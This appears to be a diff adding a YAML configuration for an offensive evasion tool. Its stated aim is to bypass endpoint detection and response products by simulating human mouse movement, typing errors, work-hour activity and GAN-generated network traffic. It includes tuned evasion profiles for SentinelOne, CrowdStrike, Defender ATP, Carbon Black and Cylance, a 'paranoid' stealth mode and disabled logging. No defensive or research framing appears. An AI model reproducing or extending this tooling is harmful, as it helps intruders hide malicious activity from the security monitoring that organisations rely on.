@@ -1,0 +1,183 @@
+# Behavioral Mimicry Configuration
+# ================================
+# Human-like behavior simulation to bypass EDR behavioral ML detection
+# Target: SentinelOne Behavioral Score = 0
+
+# Mimicry Mode
+# ------------
+# disabled - No mimicry (fastest, highest risk)
+# light    - Basic timing jitter only
+# moderate - Mouse + keyboard simulation
+# aggressive - Full human simulation
+# paranoid - Maximum stealth, continuous activity (recommended)
+# human    - Indistinguishable from real user (slowest)
+mimicry_mode: paranoid
+
+# Auto-Detection
+# --------------
+# Automatically detect EDR and adjust mimicry level
+auto_detect_edr: true
+
+# Continuous Mimicry
+# ------------------
+# Run background human-like activity continuously
+continuous_mimicry: true
+
+# Behavioral Profile
+# ------------------
+profile:
+  # Typing speed: slow, average, fast, expert
+  typing_speed: average
+  
+  # Mouse speed: slow, average, fast
+  mouse_speed: average
+  
+  # Typing error rate (0.0 - 1.0)
+  # Human average is ~2%
+  error_rate: 0.02
+  
+  # Activity timing variance (0.0 - 1.0)
+  # Higher = more random timing
+  activity_variance: 0.3
+  
+  # Break frequency in minutes
+  break_frequency: 45
+  
+  # Work hours (start_hour, end_hour)
+  # Activity patterns change outside work hours
+  work_hours:
+    start: 9
+    end: 17
+  
+  # Preferred applications (for window switching simulation)
+  preferred_apps:
+    - chrome
+    - outlook
+    - excel
+    - notepad
+    - teams
+
+# Mouse Simulation
+# ----------------
+mouse:
+  # Use Bézier curves for natural movement
+  bezier_curves: true
+  
+  # Number of control points for curves
+  curve_control_points: 2
+  
+  # Simulate overshoot and correction
+  overshoot_enabled: true
+  overshoot_rate: 0.15
+  
+  # Micro-movements (hand tremor simulation)
+  micro_movements: true
+  
+  # Screen dimensions (auto-detected if not set)
+  # screen_width: 1920
+  # screen_height: 1080
+
+# Keyboard Simulation
+# -------------------
+keyboard:
+  # Include realistic typos
+  include_errors: true
+  
+  # Typo correction rate (most humans correct ~80%)
+  correction_rate: 0.8
+  
+  # Double letter typo rate
+  double_letter_rate: 0.01
+  
+  # Key distance affects timing
+  distance_timing: true
+  
+  # Same-hand vs different-hand timing adjustment
+  hand_timing_adjustment: true
+
+# Traffic Pattern Generation (GAN)
+# --------------------------------
+traffic:
+  # Enable GAN-based traffic generation
+  gan_enabled: true
+  
+  # Latent dimension for GAN
+  latent_dim: 32
+  
+  # Traffic pattern types
+  patterns:
+    - bursty      # Human browsing (rapid clicks, then idle)
+    - reactive    # User-initiated requests
+    - periodic    # Background checks
+  
+  # Timing constraints (milliseconds)
+  min_interval_ms: 50
+  max_interval_ms: 5000
+  
+  # Size distribution (bytes)
+  min_size_bytes: 100
+  max_size_bytes: 50000
+
+# EDR-Specific Settings
+# ---------------------
+edr_profiles:
+  sentinelone:
+    # SentinelOne requires highest stealth
+    recommended_mode: paranoid
+    behavioral_threshold: 0.1
+    focus_areas:
+      - continuous_activity
+      - natural_timing
+      - process_behavior
+  
+  crowdstrike:
+    recommended_mode: aggressive
+    behavioral_threshold: 0.2
+    focus_areas:
+      - process_tree
+      - memory_patterns
+      - threat_graph
+  
+  defender_atp:
+    recommended_mode: moderate
+    behavioral_threshold: 0.3
+    focus_areas:
+      - attack_surface_rules
+      - behavioral_blocking
+  
+  carbonblack:
+    recommended_mode: aggressive
+    behavioral_threshold: 0.2
+    focus_areas:
+      - endpoint_analysis
+      - watchlists
+  
+  cylance:
+    recommended_mode: aggressive
+    behavioral_threshold: 0.15
+    focus_areas:
+      - ml_analysis
+      - script_control
+
+# Advanced Settings
+# -----------------
+advanced:
+  # Minimum events before checking behavioral score
+  min_events_for_score: 100
+  
+  # Score improvement factors by runtime
+  runtime_score_factors:
+    60: 0.95     # 1 minute
+    300: 0.90    # 5 minutes
+    900: 0.85    # 15 minutes
+  
+  # Activity burst settings
+  burst_probability: 0.3
+  idle_probability: 0.2
+  
+  # Thread settings for continuous mimicry
+  mimicry_thread_daemon: true
+  
+  # Logging
+  log_events: false
+  log_level: INFO
